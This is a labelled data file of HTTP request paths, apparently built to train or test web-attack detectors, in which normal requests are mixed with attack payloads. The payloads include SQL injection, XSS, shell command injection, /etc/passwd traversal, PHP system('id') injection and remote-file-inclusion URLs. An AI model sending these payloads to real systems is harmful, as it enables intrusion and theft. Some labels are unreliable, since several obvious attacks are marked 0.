request	label
/ 000027381 / 	0
"/ en-us /  < script > document . cookie =  "" testfutf = 1550 ;  ""  <  / script > "	1
/ string / strings / parameters = lapa ,  la 	0
/ h21y8w52 . kspx ?  < script > cross_site_scripting . nasl <  / script > 	1
/ javascript / mssql / 	0
/ javascript / 15 . trace 	0
/ topic_misusesoftechnology / 	0
"/ main . php ? stuff =  ""  & rm q86234546 & rem "	1
/ string / strings / parameters = ;  exec xp_regread 	1
/ string / strings / parameters = -9005 union all select 4410 # 	1
/ f141299f / 	0
/ string / strings / parameters = miles_detmers @ sotelink . vu 	0
/ 0rufe52p . htm ?  < script > cross_site_scripting . nasl <  / script > 	1
/ 2157214300054188876aqxhyz_th / 	0
/ a48451094 / 	0
/ main . php ? stuff =  ' uname  > q94914736  # 	1
/ img_7048 / 	0
/ downloads_servers / 	0
/ 038549 / 	0
"/ qczkquis . php3 ?  < meta http-equiv = set-cookie content =  "" testkwlg = 5591 ""  > "	1
/ ra puzz loop v1 / 	0
/ 20060919 / 	0
/  .  .  % u2215 { file } 	1
/ string / strings / parameters = calle la corta ,  85 	0
/ string / strings / parameters = & echo criqog $  (  ( 34 + 52 )  )  $  ( echo criqog ) criqog \  \ 	1
/ en-us / s7qus4g3 . fts ?  < script > cross_site_scripting . nasl <  / script > 	1
/ javascript / automatic . dll 	0
/ string / id = 1 & nombre = vino + rioja & precio = 85 & cantidad = 9 & b1 = aadir + al + carrito 	0
"/ en-us / 9kr0ih0v . cfc ?  < meta http-equiv = set-cookie content =  "" testzgnm = 1183 ""  > "	1
/ string / strings / parameters = order by 7 -- 	1
/ string / modo = registro & login = chihhua & password = iri4ar & nombre = hebert & apellidos = fonts + westermeier & email = hemmings_vos @ programasalquilermaquinaria . ag & dnia = 55492932g & direccion = c /  + bazan + 184 + 4 ? a & ciudad = garcia & cp = 10812 & provincia = soria & ntc = 2183980302594165 & b1 = registrar 	1
/ javascript / util . tar . bz2 	0
/ scripts / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331909220 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00 	1
/ manager / snpfiltered . pl ? t = c & u =  < script > foo <  / script > 	1
/ mclaughlin9 / 	0
"/ v3axg1p8 . php ?  < meta http-equiv = set-cookie content =  "" testxagh = 6987 ""  > "	1
/ sales_japan / 	0
/ string / strings / parameters = ;  str =  $  ( echo kfnnby )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  | 	1
/ javascript / cal . swf 	0
/ class-gtktooltips / 	0
/ hhouse_tn / 	0
/ string / strings / parameters = rothamel 	0
"/ uvazfs7p . jspa ?  < meta http-equiv = set-cookie content =  "" testwtbo = 4831 ""  > "	1
/ manager / html ? org . apache . catalina . filters . csrf_nonce = 2deac51318be564dc791daa9b3d06551 	0
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo xdaibc )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  | 	1
"/ tuwjta1w . cgi ?  < meta http-equiv = set-cookie content =  "" testpokn = 7494 ""  > "	1
/ string / strings / parameters = 1 '  )  )  )  ; select pg_sleep ( 5 )  and  (  (  (  ' qslr '  =  ' qslr 	1
/ string / strings / parameters = echo $ ifsyukknh $  (  ( 56 + 49 )  )  $  ( echo $ ifsyukknh ) yukknh & 	1
/ string / strings / parameters = 37167690n 	0
/ script /  / ident / index . php ? path_inc = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ? 	1
/ javascript / goaway . php3 	0
/ telenovelas / 	0
/ 155116 / 	0
/ string / strings / parameters = c632i6ela 	0
/ sss_sdk / 	0
/ string / str =  $  ( echo nndfmh )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  ' 	1
/ string / modo = entrar & login = chueh5 & pwd = 37ce & remember = on & b1 = entrar 	0
/ cgis / a1stats / a1disp4 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ cgi-bin / module . php ? module = osticket & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ double_vee / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  as nncz where 2331 = 2331 ; select case when 6420 = 7941 then 1 else null end -- "	1
/ string / strings / parameters = -9953 '  |  |  ( select  ' zljk '  where 2886 = 2886 union all select 2886 , 2886 , 2886 , 2886 , 2886 , 2886 , 2886 , 2886 , 2886 , 2886 # 	1
"/ eg2u8pbv . do ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / modo = registro & login = hu * yv ? an & password = atab2rdi8la7o & nombre = adelfo & apellidos = stumptner & email = lembeck @ tuslimites . fo & dni = 72510261r & direccion = passeig + bejar ,  + 173 + 2h & ciudad = quirs & cp = 41930 & provincia = girona & ntc = 9285059001165712 & b1 = registrar 	1
/ 042422 / 	0
/ examples / jsp / cal / pwcgi / smpwservicescgi . exe ? target = http :  /  / www . nessus . org 	1
/ string / strings / parameters = capmany ,  94 4 ? e 	0
/ 042099 / 	0
/ index_173 / 	0
/ marion-county / 	0
/ rv98iwjp . idc ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = 4610658579626439 	0
/ javascript / ad . cfg 	0
/ string / strings / parameters = 9nte0uer3o 	0
/ ai_nssecurelock / 	0
/ secretgov / 	0
/ string / id = 2 & nombre = vino + rioja & precio = 100 & cantidad = 48 & b1 = aadir + al + carrito 	0
/ behind the eye - eye q compilation vol iii / 	0
/ string / modo = entrar & login = woins ? ky & pwd = pagadera & remember = off & b1 = entrar 	1
/ javascript /  . passwd . sql 	1
/ string / modo = entrar & login = asia & pwd = 67estada & remember = on & b1 = entrar 	0
/ 20061213-8411 / 	0
/ cgi-home / dcforum . cgi ? az = list & forum =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / strings / parameters = 2230 	0
/ pizdoblyad / 	0
/ string / strings / parameters = 1 '  +  ( select  ' eoxk '  where 6621 = 6621 union all select null , null # 	1
/ string / strings / parameters = odelia 	0
"/  "" rss + security ""  / "	1
/ string / id = 2 & nombre = vino + rioja & precio = 39 & cantidad = 36 & b1 = aadir + al + carrito 	0
"/ string / strings / parameters = ""  )  , null )  waitfor delay  ' 0 : 0 : 20 '   -- "	1
/ javascript / fonts . vbs 	0
/ vr000007068 / 	0
/ javascript / dba . exe 	1
/ ajax . php ? rs = __exp__getfeedcontent & rsargs [  ]  = -99 union select 2020390524 , 2 , 880987929 , 4 , 5 , 6 , 7 , 8 , 9 , 0 , 1 , 2 , 3  -- 	0
/ pubdate / 	0
/ javascript / bin . tar 	0
/ 102243 / 	0
"/ main . php ? stuff =  "" ping -w 8000 -n 1 4 . 3 . 2 . 1 & rem "	1
/ javascript / eu . c 	0
/ string / strings / parameters = murueta 	0
/ javascript / bloggers . as 	0
/ string / strings / parameters = san roman 140 ,  2e 	0
/ 003655a / 	0
/ string / strings / parameters = 1 )  ;  ( select  *  from  ( select ( sleep ( 5 )  )  ) srmq )  and  ( 9069 = 9069 	1
/ string / strings / parameters = '  ) print (  ` echo tyajkr `  .  ` echo  $  (  ( 73 + 69 )  )  `  .  ` echo tyajkr `  .  ` echo tyajkr `  )  ;  .  ' tyajkr 	1
"/ string / modo = entrar & login = boehlke & pwd = retahla & remember = off & b1 =  < script > alert (  "" paros ""  )  ;  <  / script > "	1
/ string / strings / parameters = 1 '  and 6537 = dbms_pipe . receive_message ( chr ( 76 )  |  | chr ( 116 )  |  | chr ( 117 )  |  | chr ( 65 )  , 5 ) 	1
"/ main . php ? stuff =  "" del \ x0bq36113668 & rem \ x0b "	1
/ javascript / rb . cc 	0
/  .  /  .  .  /  .  { file } 	1
/ anttikuntsi / 	0
/ classsys / 	0
/ noel_158x158 / 	0
/ bond-one / 	0
/ 20011016-2 / 	0
/ 8051iconheadervers1 / 	0
/ mail . php ? id =  '  /  *  *  / union /  *  *  / select /  *  *  / 1 , 2 , 1332010406 , 4 --  & blog = 1 	1
/ video_spy / 	0
/ modules / xt_conteudo / admin / spaw / spaw_control . class . php ? spaw_root = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ? 	0
/ string / strings / parameters = malacopterigio 	0
/ string / modo = insertar & precio = 587 & b1 = confirmar / 	1
"/ string / strings / parameters = `  ""  '  >  < img src = xxx : x onerror \ x0d = javascript : alert ( 1 )  > "	1
/ cgi-bin / calendar_admin . pl ? config =  | cat  / etc / passwd | 	1
/ wheeloyum / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo zepvfu )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  ' 	1
/ 165239 / 	0
/ string / modo = registro & login = sathe9 & password = lobanillo & nombre = paladio & apellidos = ribot + velugo & email = bonagura . orimoto @ portaldesign . ht & dni = 48638626c & direccion = calle + san + juan + 151 + 1e & ciudad = castejn & cp = 46183 & provincia = burgos & ntc = 8069899417976960 & b1 = registrar 	0
/ cgi-bin / mail . php ? id =  '  /  *  *  / union /  *  *  / select /  *  *  / 1 , 2 , 1331919224 , 4 --  & blog = 1 	1
/ string / strings / parameters = 1 )  )  )  union all select null , null , null , null , null , null , null , null -- 	1
/ javascript / cgi-bin2 . js 	0
/ contestant_appform / 	0
/ string / strings / parameters = 5854 	0
/ modules . php ? op = modload & name = wiki & file = index & pagename =  < script > alert (  ' vulnerable '  )  <  / script > 	1
/ string / strings / parameters = 1 )  )  )  and elt ( 3132 = 1541 , 1541 )  and  (  (  ( 4258 = 4258 	1
/ iissamples / sdk / asp / docs / winmsdp . exe 	1
/ seeitinaction / 	0
"/ help . php ? q =  ""  | ping \ x0c-w \ x0c9000 \ x0c-n \ x0c1 \ x0c4 . 3 . 2 . 1 | rem \ x0c "	1
/ cgi-bin / fileseek . cgi ? foot =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc / passwd & head = 	1
/ projekt- gothic / 	0
/ cgi-win / pfdisplay . cgi ?  '  \ x0a / bin / cat  / etc / passwd |  ' 	1
/ string / strings / parameters = c /  borja 137 8 ? c 	0
"/ string / strings / parameters = 1 ""  ""  )  )  and make_set ( 8266 = 9226 , 9226 )  and  (  (  ""  "" omjx ""  ""  like  ""  "" omjx "	1
"/ string / strings / parameters = 1 ""  ""  )  or 7552 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  and  (  ""  "" bvdv ""  ""  like  ""  "" bvdv "	1
/ en-us / s7qus4g3 . aspx ?  < script > cross_site_scripting . nasl <  / script > 	1
/ talking stocks v2 / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  )  and 3202 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  and  (  (  (  ""  "" tkkg ""  ""  =  ""  "" tkkg "	1
/ 1116_01 / 	0
/ examples / jsp / colors / ikonboard . cgi ? act = st & f = 1 & t = 1 & hl = nessus & st =  ' 	1
"/ pm_buddy_list . asp ? name = a & desc = b ""  >  < script > alert (  ' vulnerable '  )  <  / script >  < a s =  ""  & code = 1 "	1
/ string / strings / parameters = -9922 '  )  )  union all select 2193 , 2193 , 2193 -- 	1
/ javascript / systems . ws 	0
/ hostnav2 / 	0
/ string / strings / parameters = entremezclar 	0
/ policydisplay / 	0
/ string / strings / parameters = rist 	0
/ examples / jsp / jsp2 / el / admin / login . php 	0
/ 20shake / 	0
/ biosdiag / 	0
/ string / strings / parameters = 69 	0
/ en-us / account / bb-hostsvc . sh ? hostsvc =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
"/ string / strings / parameters = 1 ""  ""  ; begin dbms_lock . sleep ( 5 )  ;  end "	1
/ b41485f1165dd3213a486a218f06dae6 / 	0
/ 506140 / 	0
/ axyas01 / 	0
/ string / modo = registro & login = thyagara & password = fuerte & nombre = il , i ? dio & apellidos = gorgone + oteo & email = tissier @ b-sign . cg & dni = 03028605b & direccion = calle + alboran + 39 ,  +  & ciudad = millanes & cp = 49731 & provincia = tarragona & ntc = 4096797311989091 & b1 = registrar 	1
"/ string / strings / parameters = 1 ""  ""  )  )  )  and 3202 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  and  (  (  (  ""  "" oohx ""  ""  like  ""  "" oohx "	1
/ string / id = 2 & nombre = vino + rioja & precio = 39 & cantidad = 12 & b1 = aadir + al + carrito 	0
/ safari_co-brand / 	0
/ sl-5700 / 	0
/ string / strings / parameters = 1 '  or 2633 = dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 65 )  |  | chr ( 65 )  |  | chr ( 103 )  , 5 )  and  ' gkku '  like  ' gkku 	1
/ string / modo = entrar & login = merlina & pwd = si6bionte & remember = off /  & b1 = entrar 	1
/ newscom / 	0
"/ bxnyrhmh . kspx ?  < meta http-equiv = set-cookie content =  "" testmjct = 1867 ""  > "	1
/ examples / jsp / num / bigconf . cgi ? command = view_textfile & file =  / etc / passwd & filters =  ; 	1
/ top . php ? stuff =  & ver \ x0b > q21316317 & rem \ x0b 	1
/ d00_07 / 	0
/ string / modo = insertar & precio = 3916 & b1 = confirmar 	0
/ examples / jsp / sessions / a1disp3 . cgi ?  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = |   [  1 -ne  $  ( echo rbbjar  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1 	1
/ string / strings / parameters = '  ; echo nucrtg $  (  ( 61 + 63 )  )  $  ( echo nucrtg ) nucrtg ' 	1
/ javascript / databases . exe 	1
/ javascript / marketing . exe 	1
"/ string / strings / parameters = '  & echo $ ifsuskoqc $  (  ( 80 + 64 )  )  $  ( echo $ ifsuskoqc ) uskoqc "" "	1
/ string / strings / parameters = edelman1 @ hotelestopsecret . mt 	0
/ hsi_ec39 / 	0
/ tk14966-class / 	0
/ string / strings / parameters = 2187426645944865 	0
/ scanimage68 / 	0
/ string / modo = insertar & precio = 9380 & b1 = pasar + por + caja 	0
/ string / strings / parameters = & echo jbpwlj $  (  ( 57 + 13 )  )  $  ( echo jbpwlj ) jbpwlj /  / 	1
/ string / strings / parameters = |   [  4 -ne  $  ( echo pengwj  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  & 	1
/  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  { file } 	1
"/ i7prbs22 . kspx ?  < script > document . cookie =  "" testjnre = 7328 ;  ""  <  / script > "	1
/ string / strings / parameters = graciano 	0
/ javascript / store . exe 	1
/ string / strings / parameters = 03344221k 	0
/ string / modo = registro & login = kiri & password = vajil-la & nombre = amelie & apellidos = radresa + tudn & email = sennett @ ankawaelda . tr & dni = 64556150a & direccion = chopo ,  + 10 +  & ciudad = palma + de + cervell ,  + la & cp = 49156 & provincia = huesca & ntc = 3317442744266794 & b1 = registrar 	0
/ 41100_small / 	0
/ javascript / promotion . pl 	0
/ dvdripper-sdownload / 	0
/ newyork_utica / 	0
/ missingmanual-tm / 	0
/ string / id = 1 & nombre = queso + manchego & precio = 85 & cantidad = 31 & b1 = aadir + al + carrito 	0
/ string / strings / parameters = 30736152x 	0
/ rest_gifts / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo fokdal )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
/ javascript / whosonline . as 	0
/ cgi-local / gw5 / gwweb . exe ? help = bad-request 	1
"/ h5sc3gxy . idc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ zv8tv7h8 . cgi ?  < meta http-equiv = set-cookie content =  "" testcqwz = 9752 ""  > "	1
/ 000025470 / 	0
/ aftereffectsid / 	0
/ string / strings / parameters = 1 '  or char ( 119 )  |  | char ( 100 )  |  | char ( 99 )  |  | char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 )  , 0 )  , 5000000000 )  , null )  -- 	1
/ alertdetail / 	0
/ 386654 / 	0
/ 162560 / 	0
/ trojdloaderzb / 	0
/ body_dottedline / 	0
"/ main . php ? stuff =  "" ping \ x0b-w \ x0b11000 \ x0b-n \ x0b1 \ x0b1 . 2 . 3 . 4 & rem \ x0b "	1
/ string / strings / parameters = calle bullaque ,  46 10-f 	0
/ javascript / asset . jsf 	0
/ scripts / web_store / web_store . cgi ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html 	1
/ 200_warne1 / 	0
"/ 3m5knyc4 . do ?  < script > document . cookie =  "" testbgqj = 6434 ;  ""  <  / script > "	1
/ common . php ? ezt_root_path =  @ rfiurl ? ezt_root_path =  @ rfiurl ? 	0
/ string / str =  $  ( echo dmzptc )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | 	1
/ get_advice / 	0
/ components / com_mambowiki / mambologin . php ? ip = xxpathxx ? 	1
/ string / modo = registro & login = duffy & password = acabadamente & nombre = tali & apellidos = nrez + muriscot & email = vanity @ espaciodelpintor . kn & dni = 88102583w & direccion = albadalejo + hijuela + 76 ,  +  & ciudad = lomoviejo & cp = 09247 & provincia = barcelona & ntc = 2777667912628191 & b1 = registrar 	0
/ string / strings / parameters = 1 '  )  and  ( select  *  from  ( select ( sleep ( 5 )  )  ) fzno )  and  (  ' svwr '  =  ' svwr 	1
/ string / strings / parameters = carmia 	0
"/ qczkquis . idc ?  < meta http-equiv = set-cookie content =  "" testkwlg = 5591 ""  > "	1
/ string / strings / parameters = 4m4or6711a662 	0
/ string / strings / parameters = kneeshaw 	0
/ string / strings / parameters = suto8i + a 	0
/ wgslogo / 	0
"/ string / strings / parameters = ""  |   [  2 -ne  $  ( echo gzciaw  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  & "	1
/ vorstandsberichte_drucken / 	0
"/ en-us / account / awstatstotals . php ? sort =  ""  ]  . passthru (  ' id '  )  . exit (  )  .  $ a [  "" "	1
/ isable999 / 	0
/ javascript / cgiwrap . swf 	0
"/ examples / servlets / servlet / user . cgi ? url =  ""  >  < script > alert (  "" gossamer_links_url_xss . nasl ""  )  ;  <  / script >  & from = add "	1
/ 1490361612 / 	0
/ public_includes / pub_blocks / activecontent . php ? vsdragonrootpath = xxpathxx 	1
/ javascript / em . manifest 	0
"/ string / strings / parameters = ;  str =  $  ( echo hdixth )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "" "	1
"/ string / strings / parameters = ""  ""  ` false `  ""  "" "	1
/ bridge-tunnel / 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' jpow '  from dual where 4381 = 4381 and  ( select 9067 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9067 = 9067 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  )  |  |  ' 	1
/ string / str =  $  ( echo zdskke )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
/ siamese-twins / 	0
/ string / strings / parameters = ;  str =  $  ( echo dapkxg )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  # 	1
/ string / strings / parameters = 1 '  )  where 5214 = 5214 ; if ( 7899 = 7899 )  select 7899 else drop function zbbp -- 	1
/ php . cgi ?  / etc / passwd 	1
/ arrangements / 	0
"/ string / strings / parameters = < script src =  "" data :  & comma ; alert ( 1 )  /  / "	1
/ iajtej82 . do ?  < script > cross_site_scripting . nasl <  / script > 	1
/ invest_vienna / 	0
"/ en-us /  < script > document . cookie =  "" testzgnm = 1183 ;  ""  <  / script > "	1
"/ string / strings / parameters = < script > document . cookie =  "" testxeoi = 3573 ;  ""  <  / script > "	1
/ string / id = 3 & nombre = jamn + ibrico & precio = 100 & cantidad = 74 & b1 = aadir + al + carrito 	0
/ string / strings / parameters = 02127 	0
/ rad21070_th / 	0
/ 2000_11 / 	0
/ pacestar-software / 	0
/ juryban / 	0
/ v06_index / 	0
"/ main . php ? logout =  "" ver \ x0b > q22255946 & rem \ x0b "	1
"/ main . php ? stuff =  "" rm , q26668686 & rem , "	1
/ phpmyadmin / index . php ? cid =  ' 	1
/ lawenforcementtraining / 	0
/ javascript / hp . ini 	0
/ string / strings / parameters = 45212 	0
/ string / strings / parameters = 0891192306237140 	0
/ i could sing of your love forever / 	0
/ 462559894 / 	0
"/ help . php ? q =  ""  \ x0drm q43695626  # "	1
/ string / strings / parameters = | echo $ ifsnpyjmp $  (  ( 96 + 63 )  )  $  ( echo $ ifsnpyjmp ) npyjmp 	1
/ string / modo = registro & login = pammie & password = v $ idr3ar & nombre = sayara & apellidos = cagnoli & email = clavering @ pinturasultravioleta . pro & dni = 63829565b & direccion = aurora + bertrana + salazar + 10 + 3-c & ciudad = hornos & cp = 45634 & provincia = valladolid & ntc = 4226046499602528 & b1 = registrar 	0
/ string / strings / parameters = 1 '  where 9605 = 9605 procedure analyse ( extractvalue ( 5840 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end )  )  , 0x717a767a71 )  )  , 1 )  -- 	1
/ 2172726 / 	0
"/ string / strings / parameters = 1 ""  ""  )  as wvxt where 7321 = 7321 and 8312 = dbms_pipe . receive_message ( chr ( 69 )  |  | chr ( 79 )  |  | chr ( 101 )  |  | chr ( 68 )  , 5 )  -- "	1
/ groupnav_05 / 	0
/ javascript / dl . orig 	0
"/ string / strings / parameters = & echo tiieey $  (  ( 36 + 32 )  )  $  ( echo tiieey ) tiieey "" "	1
/ string / strings / parameters = 1 '  )  )  ; select case when 2930 = 7964 then 1 else null end -- 	1
/ documentation / emergency_user_readme . txt 	0
/ string / strings / parameters = arpe * nde 	0
"/ string / strings / parameters = ""  | echo $ ifscdyirq $  (  ( 76 + 46 )  )  $  ( echo $ ifscdyirq ) cdyirq | "	1
/ irish_question / 	0
/ 000119768 / 	0
/ javascript / phorum . xls 	0
"/ oie504mr . aspx ?  < script > document . cookie =  "" testtpby = 7052 ;  ""  <  / script > "	1
"/ help . php ? q =  ""  \ x0duname \ x09 > q93881688 \ x09 # "	1
/ screenclickcom_ / 	0
/ winpim / 	0
/ 2172203 / 	0
/ editor ' s_letter / 	1
/ string / strings / parameters = zelda_hjelm5 @ silver-knights . it 	0
/ string / modo = registro & login = julee & password = al9u12z3 & nombre = basiana & apellidos = fiesco + terrazas & email = wakefield . yniguez @ aebo . so & dni = 43471294y & direcciona = c /  + santa + florentina + 9 ,  + 11 ? h & ciudad = asparrena & cp = 16841 & provincia = lleida & ntc = 6355628611222298 & b1 = registrar 	1
"/ gvx7m5ti . asp ?  < script > document . cookie =  "" testwldz = 3506 ;  ""  <  / script > "	1
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo clrjxd )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ "	1
/ blast_openingtimes / 	0
/ cacti / manager / media / browser / mcpuk / connectors / php / commands / thumbnail . php ? base_path =  / etc / passwd \ x00 	1
/ e9rx3ya4 . nsf ?  < script > cross_site_scripting . nasl <  / script > 	1
/ pit-19419 / 	0
"/ top . php ? stuff =  ""  & ping \ xa0-w \ xa07000 \ xa0-n \ xa01 \ xa01 . 2 . 3 . 4 & rem \ xa0 "	1
/ string / strings / parameters = valdeprados 	0
"/ string / strings / parameters = 1 ""  ""  )  )  as ltco where 3862 = 3862 or 5286 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  -- "	1
"/ string / strings / parameters = 1 ""  ""  ; select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 "	1
/ string / modo = registro & login = emesh & password = retocador & nombre = iracema & apellidos = hinojosa + zuba & email = garzon6 @ mtos . ro & dni = 56597686e & direccion = fray + bernardino + de + sahagun ,  + 116 + 9c & ciudad = bustillo + de + la + vega & cp = 45479 & provincia = vizcaya & ntc = 4935554028654452 & b1 = registrar 	0
/ 5 urodziny vol / 	0
/ nmw0do67 . mscgi ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ string / id = 1 & nombre =  ""  >  <  !  --  # exec + cmd =  "" dir +  ""  --  >  <  & precio = 100 & cantidad = 15 & b1 = aadir + al + carrito "	1
/ search . php ? inspath = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ? 	0
/ string / modo = registro & login = attilio & password = tu6e3a5a & nombre = obdulio & apellidos = gadea + prat & email = belmondo @ artesania . org . ci & dni = 39152269j & direccion = calle + capitan + salas + 97 ,  +  & ciudad = garciaz & cp = 09227 & provincia = cceres & ntc = 5255016250924292 & b1 = registrar 	0
/ legend of zelda the minish cap / 	0
/ string / strings / parameters = ' echo ggrvqx $  (  ( 86 + 56 )  )  $  ( echo ggrvqx ) ggrvqx /  / 	1
/ movie33 / 	0
/ tracert_broken / 	0
/ scripts / index . php ? libdir = http :  /  / xxxxxxxx 	1
/ string / strings / parameters = 1 '  +  ( select llcl where 8188 = 8188 and 2716 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  -- 	1
/ string / strings / parameters = < embed src =  /  onload = alert ( 5 )  > 	1
"/ yef5f3d5 . cgi ?  < meta http-equiv = set-cookie content =  "" testcrcv = 6167 ""  > "	1
/ javascript / ee . js 	0
/ 435786 / 	0
/ tncosmthemovie / 	0
/ string / strings / parameters = goring @ quadernideilgarda . pl 	0
"/ main . php ? logout =  ""  & rm \ x09q84263823 \ x09 # "	1
/ jmdetail / 	0
/ cicshop / 	0
/ 3hj9nxsextdt / 	0
/ string / strings / parameters = haydock 	0
/ string / strings / parameters = < svg / onload = eval ( location . hash . slice ( 1 )  )  >  ?  # alert ( 1 ) 	1
"/ string / strings / parameters = -4054 ""  ""  or 2824 = 4788 -- "	1
/ pict239 / 	0
/ string / strings / parameters = @  ' 	1
/ string / strings / parameters = 5458137818336951 	0
"/  ?  < meta http-equiv = set-cookie content =  "" testsory = 7676 ""  > "	1
"/ raanw4ia . asp ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 050103-142514 / 	0
/ ropetop / 	0
/ string / modo = registro & login = mongo & password = behetra & nombre = fanny & apellidos = llort + pato & email = twiggy @ ladigianni . vc & dni = 07831245k & direccion = calle + do + fuso + 19 +  & ciudad = piqueras & cp = 06208 & provincia = soria & ntc = 3479188393486250 & b1 = registrar 	0
/ examples / servlets / servlet / index2 . php ? _server [  ]  =  & _server [ remote_addr ]  =  '  . system (  ' id '  )  . exit (  )  .  '  & option = wrapper & module [ module ]  = 1 	1
/ date-r0 / 	0
/ examples / jsp / cal / wa . exe ? debug-show-version 	1
